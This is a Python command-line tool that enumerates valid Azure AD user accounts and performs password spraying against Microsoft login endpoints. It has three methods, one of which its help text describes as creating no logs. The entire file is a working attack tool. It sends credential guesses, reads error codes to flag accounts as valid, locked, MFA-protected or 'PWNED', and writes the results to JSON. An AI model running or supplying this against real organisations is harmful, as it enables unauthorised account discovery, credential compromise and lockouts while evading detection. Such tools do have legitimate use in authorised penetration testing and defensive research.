#!/usr/bin/python3

'''
Copyright (C) 2022 Cody Martin BLSOPS LLC

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.
'''

import sys
import argparse
import colorama
import time
import json
import requests
import uuid
from datetime import datetime
from datetime import timezone
from datetime import timedelta
import xml.etree.ElementTree as ET

# Set up our colors
colorama.init()
SUCCESS = colorama.Fore.GREEN
VALID = colorama.Fore.CYAN
DANGER = colorama.Fore.RED
WARNING = colorama.Fore.YELLOW
RESET = colorama.Style.RESET_ALL

# Set up argparse stuff
methods = [
	'normal',
	'login',
	'autologon'
]

description = f'''
  =====================================================================================
  # This module will enumerate for valid user accounts in an Azure AD environment     #
  # There are three methods to enumerate with: login, autologon, normal               #
  #                                                                                   #
  # Default method: normal                                                            #
  #                                                                                   #
  # You may supply either a single username to test, or a user list                   #
  # Supplying a password will insert it into either the 'login' or 'autologon' method #
  # If the password is correct, account will be marked 'PWNED'                        #
  #                                                                                   #
  #{DANGER} Using the 'login' method will create failed authentication logs in Azure AD {RESET}      #
  #                                                                                   #
  #{WARNING} Using the 'autologon' method will not create any logs, but is less accurate {RESET}      #
  =====================================================================================
'''

arg_parser = argparse.ArgumentParser(prog='user_enum.py',
						usage=SUCCESS + '%(prog)s' + RESET + ' [-m login-method | '\
							'-u username | -i input-list | -o outfile]',
						description=description,
						formatter_class=argparse.RawDescriptionHelpFormatter)
arg_parser.add_argument('-m',
						'--method',
						metavar='<method>',
						dest='method',
						type=str,
						help=f'The login method you would like to use (default is normal), select one '\
									f'of {str(methods).replace(","," ").replace("[","").replace("]","")}',
						choices=methods,
						required=False)
arg_parser.add_argument('-u',
						'--username',
						metavar='<test@domain.com>',
						dest='username',
						type=str,
						help='The username you would like to test',
						required=False)
arg_parser.add_argument('-i',
						'--input-list',
						metavar='</path/to/usernames.txt>',
						dest='input_list',
						type=str,
						help='Text file containing usernames you want to test',
						required=False)
arg_parser.add_argument('-p',
						'--password',
						metavar='<password>',
						dest='password',
						type=str,
						help='The password you want to spray with. Only works with '\
									'\'login\' and \'autologon\' methods.',
						required=False)
arg_parser.add_argument('-o',
						'--outfile',
						metavar='</path/to/output/directory/>',
						dest='outfile_path',
						type=str,
						help='Path to where you want to save your results',
						required=False)

args = arg_parser.parse_args()

if args.method is None:
	args.method = 'normal'

# Set a default outfile if none is given
outfile_path = args.outfile_path
if outfile_path is None:
	outfile = './' + time.strftime('%Y-%m-%d_%H-%M-%S_User-Enum.json')
else:
	if outfile_path[-1] != '/':
		outfile_path = outfile_path + '/'
	outfile = outfile_path + time.strftime('%Y-%m-%d_%H-%M-%S_User-Enum.json')

if args.username is not None:
	# Single user mode
	userlist = [args.username]
elif args.input_list is not None:
	# We better be loading from a list
	with open(args.input_list, encoding='UTF-8') as userfile:
		userlist = []
		for user in userfile.readlines():
			userlist.append(user.replace('\n', ''))
else:
	# No users supplied
	print(f'{WARNING}No users supplied with either -u or -i\n{DANGER}Exiting{RESET}')
	sys.exit()

if args.password is None:
	PASSWORD = 'none'
	CLIENT_ID = str(uuid.uuid4())
else:
	PASSWORD = args.password
	CLIENT_ID = 'd3590ed6-52b3-4102-aeff-aad2292ab01c'

results = []

if args.method == 'normal':
	for user in userlist:
		data = {
			'username': user,
			'isOtherIdpSupported': 'true',
			'checkPhones': 'true',
			'isRemoteNGCSupported': 'false',
			'isCookieBannerShown': 'false',
			'isFidoSupported': 'false',
			'originalRequest': '',
			'flowToken': ''
		}

		json_data = json.dumps(data)

		headers = {
			'Content-Type': 'application/json; charset=utf-8',
		}

		ENDPOINT = 'https://login.microsoftonline.com/common/GetCredentialType'

		json_response = requests.post(ENDPOINT, headers=headers, data=json_data).json()

		if json_response['ThrottleStatus'] == 1:
			print(f'{WARNING}Requests being throttled.{RESET}')
			EXISTS = '???'
		else:
			if json_response['IfExistsResult'] == 0 or json_response['IfExistsResult'] == 6:
				EXISTS = 'VALID'
			else:
				EXISTS = 'INVALID'

		results.append({
			'account': user,
			'exists': EXISTS
		})

elif args.method == 'login':
	for user in userlist:
		data = {
			'resource': CLIENT_ID,
			'client_id': CLIENT_ID,
			'grant_type': 'password',
			'username': user,
			'password': PASSWORD,
			'scope': 'openid'
		}

		ENDPOINT = 'https://login.microsoftonline.com/common/oauth2/token'

		headers = {
			'Content-Type': 'application/x-www-form-urlencoded'
		}

		json_response = requests.post(ENDPOINT, headers=headers, data=data).json()

		try:
			if json_response['token_type'] == 'Bearer':
				EXISTS = 'PWNED'
		except KeyError:
			response_code = json_response['error_description'].split(':')[0]
			if response_code == 'AADSTS50053':
				# The account is locked, you've tried to sign in too many
				# times with an incorrect user ID or password.
				EXISTS = 'LOCKED'
			elif response_code == 'AADSTS50126':
				# Error validating credentials due to invalid username or password.
				EXISTS = 'VALID'
			elif response_code == 'AADSTS50076':
				# Due to a configuration change made by your administrator, or because you
				# moved to a new location, you must use multi-factor authentication to access
				EXISTS = 'MFA'
			elif response_code == 'AADSTS700016':
				# Application with identifier '{appIdentifier}' was not found in the directory
				# '{tenantName}'. This can happen if the application has not been installed by
				# the administrator of the tenant or consented to by any user in the tenant.
				# You may have sent your authentication request to the wrong tenant.
				EXISTS = 'VALID'
			elif response_code == 'AADSTS50034':
				# The user account {identifier} does not exist in the {tenant} directory.
				# To sign into this application, the account must be added to the directory.
				EXISTS = 'INVALID'
			else:
				EXISTS = '???'

		results.append({
			'account': user,
			'exists': EXISTS
		})

elif args.method == 'autologon':
	for user in userlist:
		RAND_UUID = CLIENT_ID
		MESSAGE_ID = str(uuid.uuid4()).upper()
		USERNAME_TOKEN = str(uuid.uuid4()).upper()

		domain = user.split("@")[1]

		date = datetime.now(timezone.utc)
		createdUTC = date.strftime('%Y-%m-%dT%H:%M:%S.%fZ')
		expiresUTC = (date + timedelta(minutes=10)).strftime('%Y-%m-%dT%H:%M:%S.%fZ')

		ENDPOINT = f'https://autologon.microsoftazuread-sso.com/{domain}/winauth' \
								f'/trust/2005/usernamemixed?client-request-id={RAND_UUID}'

		xml = f'''<?xml version='1.0' encoding='UTF-8'?>
	<s:Envelope xmlns:s='http://www.w3.org/2003/05/soap-envelope' xmlns:wsse='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd' xmlns:saml='urn:oasis:names:tc:SAML:1.0:assertion' xmlns:wsp='http://schemas.xmlsoap.org/ws/2004/09/policy' xmlns:wsu='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd' xmlns:wsa='http://www.w3.org/2005/08/addressing' xmlns:wssc='http://schemas.xmlsoap.org/ws/2005/02/sc' xmlns:wst='http://schemas.xmlsoap.org/ws/2005/02/trust' xmlns:ic='http://schemas.xmlsoap.org/ws/2005/05/identity'>
	    <s:Header>
	        <wsa:Action s:mustUnderstand='1'>http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
	        <wsa:To s:mustUnderstand='1'>{ENDPOINT}</wsa:To>
	        <wsa:MessageID>urn:uuid:{MESSAGE_ID}</wsa:MessageID>
	        <wsse:Security s:mustUnderstand="1">
	            <wsu:Timestamp wsu:Id="_0">
	                <wsu:Created>{createdUTC}</wsu:Created>
	                <wsu:Expires>{expiresUTC}</wsu:Expires>
	            </wsu:Timestamp>
	            <wsse:UsernameToken wsu:Id="uuid-{USERNAME_TOKEN}">
	                <wsse:Username>{user}</wsse:Username>
	                <wsse:Password>{PASSWORD}</wsse:Password>
	            </wsse:UsernameToken>
	        </wsse:Security>
	    </s:Header>
	    <s:Body>
	        <wst:RequestSecurityToken Id='RST0'>
	            <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
	                <wsp:AppliesTo>
	                    <wsa:EndpointReference>
	                        <wsa:Address>urn:federation:MicrosoftOnline</wsa:Address>
	                    </wsa:EndpointReference>
	                </wsp:AppliesTo>
	                <wst:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</wst:KeyType>
	        </wst:RequestSecurityToken>
	    </s:Body>
	</s:Envelope>
	'''

		response = requests.post(ENDPOINT, data=xml)
		if response.status_code != 400:
			EXISTS: 'PWNED'
		else:
			xml_response = ET.fromstring(str(response.content, 'utf-8'))
			response_code = xml_response[1][0][2][0][1][1].text.split(':')[0]

			if response_code == 'AADSTS50053':
				# The account is locked, you've tried to sign in 
				# too many times with an incorrect user ID or password.
				EXISTS = 'LOCKED'
			elif response_code == 'AADSTS50126':
				# Error validating credentials due to invalid username or password.
				EXISTS = 'VALID'
			elif response_code == 'AADSTS50076':
				# Due to a configuration change made by your administrator, or because you moved to a new
				# location, you must use multi-factor authentication to access
				EXISTS = 'MFA'
			elif response_code == 'AADSTS700016':
				# Application with identifier '{appIdentifier}' was not found in the directory '{tenantName}'.
				# This can happen if the application has not been installed by the administrator of the
				# tenant or consented to by any user in the tenant.
				# You may have sent your authentication request to the wrong tenant.
				EXISTS = 'VALID'
			elif response_code == 'AADSTS50034':
				# The user account {identifier} does not exist in the {tenant} directory.
				# To sign into this application, the account must be added to the directory.
				EXISTS = 'INVALID'
			else:
				EXISTS = '???'
		results.append({
			'account': user,
			'exists': EXISTS
		})

for result in results:
	if result['exists'] == 'PWNED':
		print(f'{SUCCESS}[+]{RESET} {result["account"]} : {SUCCESS}{result["exists"]}{RESET}')
	elif result['exists'] == 'VALID' or result['exists'] == 'MFA' or result['exists'] == 'LOCKED':
		print(f'{VALID}[+]{RESET} {result["account"]} : {VALID}{result["exists"]}{RESET}')
	elif result['exists'] == 'INVALID':
		print(f'{DANGER}[-]{RESET} {result["account"]} : {DANGER}{result["exists"]}{RESET}')
	else:
		print(f'{WARNING}[?]{RESET} {result["account"]} : {WARNING}{result["exists"]}{RESET}')

# Write our results out to file
with open(outfile, 'w+', encoding='UTF-8') as f:
	f.write(json.dumps(results))
	f.close()
